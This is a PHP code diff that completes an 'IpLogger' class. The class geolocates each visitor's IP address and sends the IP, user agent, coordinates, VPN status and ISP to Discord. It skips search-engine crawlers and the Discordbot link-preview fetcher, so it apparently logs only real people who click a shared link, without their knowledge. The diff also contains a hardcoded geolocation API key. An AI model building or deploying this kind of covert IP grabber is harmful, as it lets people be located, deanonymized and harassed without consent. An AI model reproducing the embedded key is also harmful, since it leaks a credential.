@@ -34,4 +34,61 @@ class IpLogger {
 
         // Send data to Discord
         $discord = new Discord();
-        $response = $discord->sendIpToDisco
+        $response = $discord->sendIpToDiscord($ip, $userAgent, $geoData);
+        if ($response === false) {
+            error_log("Failed to send data to Discord");
+        }
+    }
+
+    private function getIpGeoData($ip) {
+        $apiKey = 'c3ff1ab93dd84d8f991646bd33e2bbf8'; // Replace with your ipgeolocation.io API key
+        $url = "https://api.ipgeolocation.io/ipgeo?apiKey=$apiKey&ip=$ip";
+
+        $curl = curl_init($url);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+        $response = curl_exec($curl);
+        curl_close($curl);
+
+        if ($response === false) {
+            error_log("Failed to retrieve coordinates for IP: $ip");
+            return null;
+        }
+
+        $data = json_decode($response, true);
+
+        if (isset($data['latitude']) && isset($data['longitude'])) {
+            return [
+                'latitude' => $data['latitude'],
+                'longitude' => $data['longitude'],
+                'is_vpn' => $data['is_vpn'] ?? false, // Optional field for VPN detection
+                'isp' => $data['isp'] ?? 'Unknown'
+            ];
+        } else {
+            error_log("Invalid response from IP Geolocation API for IP: $ip");
+            return null;
+        }
+    }
+
+    private function isBot($userAgent) {
+        $bots = [
+            'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
+            'yandexbot', 'sogou', 'exabot', 'facebot', 'facebookexternalhit'
+        ];
+
+        foreach ($bots as $bot) {
+            if (stripos($userAgent, $bot) !== false) {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    private function isDiscordUserAgent($userAgent) {
+        // Simple check for Discord user agent
+        // You might need to adjust this based on the exact user agent strings you want to filter out
+        return stripos($userAgent, 'Discordbot') !== false;
+    }
+}
+
+?>
